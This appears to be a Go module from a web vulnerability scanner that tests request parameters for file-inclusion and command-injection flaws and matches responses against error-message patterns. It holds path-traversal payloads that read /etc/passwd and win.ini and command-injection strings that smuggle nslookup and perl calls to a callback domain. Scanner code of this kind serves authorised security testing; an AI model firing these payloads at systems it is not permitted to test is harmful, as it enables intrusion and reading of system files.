package fileinclude

import (
	"errors"
	"glint/logger"
	"glint/nenet"
	"glint/pkg/layers"
	"glint/plugin"
	reverse2 "glint/reverse"
	"glint/util"
	"strings"
	"time"

	"github.com/thoas/go-funk"
)

var PlainArray = []string{
	`63c19a6da79816b21429e5bb262daed863c19a6da79816b21429e5bb262daed8`,
	`java.lang.IllegalArgumentException: URI can\'t be null.`,
	`<title>AcuMonitor</title>`,
	`; for 16-bit app support`,
	`/bin/sh`,
}

var RegexArray = []string{
	`(#\s\/etc\/shells:)`,
	`Failed opening required\s'.*?yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.*?'\s`,
	`Warning: fopen\(.*?yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.*?\)\s`,
	`(<b>Warning<\/b>:.*: Failed opening '.*yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.*') for inclusion.*`,
	`\[FileNotFoundException:\sCould\snot\sfind\sfile\s'.*yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.*'.\]`,
	`java.io.FileNotFoundException:\s.*?\shttp:\/\/dicrpdbjmemujemfyopp.zzz\/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.*`,
	`java\.net\.MalformedURLException:\sno protocol:\s1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs`,
	`java\.lang\.IllegalArgumentException:\sURI has an authority component`,
	`(org.apache.jasper.JasperException: .*? File .*? not found)`,
	`(Failed opening '.*yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.*' for inclusion)`,
	`(<b>(Warning|Fatal\serror)<\/b>:(?:(?:\s*?main\(\))|(?:\s*?(include|include_once|require|require_once)\(\) \[<a href='function.(include|require)'>function.(include|require)<\/a>\])): Failed opening (required\s)?'.*yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.*')`,
	`(java\.io\.FileNotFoundException:\s.*?:\/[A-Za-z0-9\.\-]+\/t\/fit.txt\s)`,
	`(java.io.FileNotFoundException:\shttps?:\/\/.*?\/[A-Za-z0-9\.\-]+)[\s\n]`,
	`(java.io.FileNotFoundException:\/[A-Za-z0-9\.\-]+\/t\/fit.txt)[\s\n]`,
	`(<b>Warning<\/b>:  (file_get_contents\(.*yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.*\)( \[<a href='function.file-get-contents'>function.file-get-contents<\/a>\])?|fopen\(.*yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.*\)( \[<a href='function.fopen'>function.fopen<\/a>\])?): failed to open stream: (No such file or directory|Invalid argument|(HTTP request failed! .*)) in <b>.*?<\/b> on line <b>.*?<\/b>)`,
}

type classFileInclude struct {
	scheme                 layers.Scheme
	TargetUrl              string
	inputIndex             int
	reflectionPoint        int
	disableSensorBased     bool
	currentVariation       int
	foundVulnOnVariation   bool
	variations             *util.Variations
	lastJob                layers.LastJob
	lastJobProof           interface{}
	scanningWAVSEP         bool
	scanningOwaspBenchmark bool
	isUnix                 bool
	isWindows              bool
	isJava                 bool
	isUnknown              bool
}

func (c *classFileInclude) ClearFeature() {
	if c.lastJob.Features != nil {
		c.lastJob.Features.Clear()
	}
	// if c.trueFeatures != nil {
	// 	c.trueFeatures.Clear()
	// }
}

func FileincludeValid(args *plugin.GroupData) (*util.ScanResult, bool, error) {
	var err error
	var variations *util.Variations
	var CFileInclude classFileInclude
	//var hostid int64
	// var blastIters interface{}
	util.Setup()
	var Param layers.PluginParam
	// layers.Init()
	ct := layers.CheckType{}
	gd := args
	Param.ParsePluginParams(args, ct)
	if Param.CheckForExitSignal() {
		return nil, false, errors.New("receive task exit signal")
	}

	sess := nenet.GetSessionByOptions(
		&nenet.ReqOptions{
			Timeout:       time.Duration(Param.Timeout) * time.Second,
			RetryTimes:    Param.MaxRedirectTimes,
			AllowRedirect: false,
			Proxy:         Param.UpProxy,
			Cert:          Param.Cert,
			PrivateKey:    Param.CertKey,
		})

	CFileInclude.lastJob.Init(Param)
	// variations,err = util.ParseUri(url)
	// BlindSQL.variations =
	if value, ok := Param.Headers["Content-Type"]; ok {
		Param.ContentType = value
	}
	logger.Success("Url:%s", Param.Url)
	variations, err = util.ParseUri(Param.Url, []byte(Param.Body), Param.Method, Param.ContentType, Param.Headers)
	//赋值
	CFileInclude.variations = variations
	CFileInclude.lastJob.Layer.Sess = sess
	CFileInclude.TargetUrl = Param.Url
	CFileInclude.lastJob.Layer.Method = Param.Method
	CFileInclude.lastJob.Layer.ContentType = Param.ContentType
	CFileInclude.lastJob.Layer.Headers = Param.Headers
	CFileInclude.lastJob.Layer.Body = []byte(Param.Body)
	defer CFileInclude.ClearFeature()
	// sess := nenet.GetSessionByOptions(
	// 	&nenet.ReqOptions{
	// 		Timeout:       time.Duration(Param.Timeout) * time.Second,
	// 		AllowRedirect: false,
	// 		Proxy:         Param.UpProxy,
	// 		Cert:          Param.Cert,
	// 		PrivateKey:    Param.CertKey,
	// 	})

	if CFileInclude.startTesting() {
		Result := util.VulnerableTcpOrUdpResult(Param.Url,
			"files include vulnerability found",
			[]string{string(CFileInclude.lastJob.Features.Request.String())},
			[]string{string(CFileInclude.lastJob.Features.Response.String())},
			"high",
			Param.Hostid, string(plugin.Fileinclude))
		gd.Alert(Result)
		return Result, true, err
	}
	return nil, false, errors.New("files include vulnerability found")
}

func (c *classFileInclude) startTesting() bool {
	c.isUnknown = true
	// rnd1 := util.RandLowLetterNumber(6)
	// rnd2 := util.RandLowLetterNumber(6)
	// regexpStr := "((" + rnd1 + "\\$\\(\\)\\\\ " + rnd2 + "\\\\nzxyu)|(" + rnd1 + "\\s" + rnd2 + "nz\\^xyu))"

	// var payload_page = []string{
	// 	`echo {rnd1}$()\\ {rnd2}\\n8z^xyu||a #' &echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #|\" &echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #`,
	// 	`&echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #' &echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #|\" &echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #`,
	// 	`|echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #' |echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #|\" |echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #`,
	// 	`&&echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #' |echo {rnd1}$()\\ {r0nd2}\\nz^xyu||a #|\" |echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #`,
	// }

	var reflect_payload_list = []string{
		// `&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&\'\\"`0&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&`\'`,

		"c:/windows/win.ini",
		`/etc/shells`,
		"file:///c:/windows/win.ini",
		"../../../../../../../../../../../../../../etc/passwd",
		"../../../../../../../../../../../../../../windows/win.ini",
		// "http://192.168.166.8:7009/fit.txt",
		// "http://192.168.166.8:7009/fit.txt%3F." + "jsp",
		// "http://192.168.166.8:7009/fit.txt%3F." + "png",
		`|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
		"$(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
		"`(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`",
	}

	flag := util.RandLowLetterNumber(8)
	reverse := reverse2.NewReverse1("", flag)
	_reverse := reverse.(*reverse2.Reverse1)

	//过测试用，爬虫还有点小问题。
	if _, ok := c.lastJob.Layer.Headers["Cookie"]; !ok {
		c.lastJob.Layer.Headers["Cookie"] = "PHPSESSID=ng1bmogj6r69ts17nak5vpvbrs; security=low"
	}

	if c.variations != nil {
		for _, p := range c.variations.Params {
			//fmt.Println(p.Name, p.Value)
			if c.foundVulnOnVariation {
				break
			}
			for _, payload := range reflect_payload_list {

				options := make(map[string]string)
				// options["urlencode"] = "disencode"
				Features, err := c.lastJob.RequestByIndex(p.Index, c.TargetUrl, []byte(payload), options)
				if err != nil {
					if Features != nil {
						defer Features.Clear()
					}
					return false
				}
				defer Features.Clear()
				for _, Plain := range PlainArray {
					if funk.Contains(Features.Response.String(), Plain) {
						c.foundVulnOnVariation = true
						return true
					}
				}
				if funk.Contains(reflect_payload_list, "{domain}") {
					newServerPayload := strings.ReplaceAll(payload, "{domain}", _reverse.Url)
					Features, err := c.lastJob.RequestByIndex(p.Index, c.TargetUrl, []byte(newServerPayload), options)
					if err != nil {
						if Features != nil {
							defer Features.Clear()
						}
						return false
					}
					if reverse2.ReverseCheck(reverse, 3) {
						c.foundVulnOnVariation = true
						return true
					}
				}

			}
		}
	}
	return false
}
